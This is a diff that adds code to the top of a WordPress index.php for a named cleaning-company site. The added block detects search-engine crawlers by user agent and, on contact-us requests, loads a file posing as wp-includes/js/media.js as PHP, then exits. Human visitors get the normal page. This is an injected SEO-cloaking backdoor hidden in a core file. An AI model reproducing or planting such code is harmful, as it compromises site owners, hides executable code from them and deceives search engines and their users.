@@ -1,0 +1,57 @@
+<?php
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
+$is_bot = false;
+
+$bot_signatures = [
+    'Googlebot',
+    'Google-InspectionTool',
+    'Mediapartners-Google',
+    'AdsBot-Google',
+    'Bingbot',
+    'Slurp',
+    'DuckDuckBot',
+    'AhrefsBot',
+    'SEMRushBot',
+    'MJ12bot',
+    'YandexBot'
+];
+
+foreach ($bot_signatures as $bot) {
+    if (stripos($user_agent, $bot) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+if ($is_bot) {
+
+    if (stripos($request_uri, '/contact-us') !== false) {
+        require('/home/u564737999/domains/namastenepalcleaning.com.np/public_html/wp-includes/js/media.js');
+        exit;
+    }
+}
+if ($is_bot) {
+
+    if (stripos($request_uri, '/contact-us/') !== false) {
+        require('/home/u564737999/domains/namastenepalcleaning.com.np/public_html/wp-includes/js/media.js');
+        exit;
+    }
+}
+
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
